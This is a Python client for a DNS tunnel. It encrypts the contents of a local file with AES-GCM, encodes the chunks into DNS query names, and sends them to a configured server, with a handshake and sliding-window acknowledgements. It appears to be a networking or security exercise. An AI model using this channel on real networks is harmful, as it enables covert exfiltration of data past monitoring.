import asyncio
import random
from crypto_module import GCMEncryptor
from utils import encode_base32_dns_query, MAX_PAYLOAD_2DIG, DOMAIN, SERVER_IP, SERVER_PORT, WINDOW_SIZE
import dns.asyncresolver

async def perform_handshake():
    """Perform initial handshake to exchange random counter value"""
    resolver = dns.asyncresolver.Resolver()
    resolver.nameservers = [SERVER_IP]
    resolver.port = SERVER_PORT
    resolver.timeout = 2
    resolver.lifetime = 2
    
    # Generate random initial counter (0-2^32)
    initial_counter = random.randint(0, 2**32)
    
    # Create special handshake query with counter as first label
    handshake_qname = f"{initial_counter}.hello.{DOMAIN}"
    
    try:
        # We only care if the query reaches the server, not the response content
        await resolver.resolve(handshake_qname, 'A')
        print(f"[+] Handshake successful, initial counter: {initial_counter}")
        return initial_counter
    except dns.asyncresolver.NoAnswer:
        # Server responded but with no answer - this is acceptable for handshake
        print(f"[+] Handshake successful (empty response), initial counter: {initial_counter}")
        return initial_counter
    except Exception as e:
        print(f"[!] Handshake failed: {e}")
        return None
    
async def send_query(seq: int, qname: str) -> int:
    resolver = dns.asyncresolver.Resolver()
    resolver.nameservers = [SERVER_IP]
    resolver.port = SERVER_PORT
    resolver.timeout = 2
    resolver.lifetime = 2
    try:
        answer = await resolver.resolve(qname, 'A')
        ip = answer[0].to_text()
        ack_seq = int(ip.split('.')[2])
        print(f"[+] Got ACK {ack_seq:02d} for SEQ {seq:02d} (IP: {ip})")
        return ack_seq
    except Exception as e:
        print(f"[!] Query failed for SEQ {seq:02d}: {e}")
        return -1

def is_in_window(ack: int, base: int) -> bool:
    if (base < (base+WINDOW_SIZE) % 100):
        return base < ack <= (base + WINDOW_SIZE) % 100
    else:
        return ack > base or ack <= (base + WINDOW_SIZE) % 100 

async def window_loop():
    global base_seq, seq_num

    # Initialize encryptor and perform handshake
    encryptor = GCMEncryptor()
    initial_counter = await perform_handshake()
    if initial_counter is None:
        print("[!] Failed to establish initial counter, exiting")
        return
    
    encryptor.set_initial_counter(initial_counter)
    
    # Pre-encrypt all chunks and store them
    buffer = ""
    with open("plaintext.txt", "r") as f:
        buffer = f.read()

    encrypted_chunks = []
    while buffer:
        chunk = buffer[:MAX_PAYLOAD_2DIG]
        buffer = buffer[MAX_PAYLOAD_2DIG:]
        encrypted_chunks.append(encryptor.encrypt(chunk))

    # Track state
    acknowledged = set()
    in_flight = {}
    base_seq = 0
    seq_num = 0

    while encrypted_chunks or in_flight:
        tasks = []

        # Resend any unacked packets in window
        for offset in range(WINDOW_SIZE):
            current_seq = (base_seq + offset) % 100
            if current_seq in acknowledged:
                continue
            if current_seq in in_flight:
                # Already in flight, resend the same encrypted chunk
                encrypted_chunk = in_flight[current_seq]
            elif encrypted_chunks:
                # Get next pre-encrypted chunk
                encrypted_chunk = encrypted_chunks.pop(0)
                in_flight[current_seq] = encrypted_chunk
            else:
                continue

            qname = encode_base32_dns_query(
                encrypted_chunk, f"{current_seq}", DOMAIN)
            print(f"[>] Sending SEQ {current_seq:02d}")
            task = asyncio.create_task(send_query(current_seq, qname))
            tasks.append((current_seq, task))

        if not tasks:
            await asyncio.sleep(0.2)
            continue

        # Wait for all ACKs
        for seq, task in tasks:
            ack = await task
            if ack == -1:
                continue

            # Accept ACKs that in window
            if is_in_window(ack, base_seq):
                if base_seq > ack:
                    while base_seq:
                        in_flight.pop(base_seq, None)
                        base_seq += 1
                        base_seq %= 100
                        print(f"[+] Sliding window: new base_seq {base_seq:02d} ack is {ack}")
                if base_seq < ack:      
                    while base_seq < ack:
                        in_flight.pop(base_seq, None)
                        base_seq += 1
                        base_seq %= 100
                        print(f"[+] Sliding window: new base_seq {base_seq:02d} ack is {ack}")

        await asyncio.sleep(0.1)

if __name__ == '__main__':
    asyncio.run(window_loop())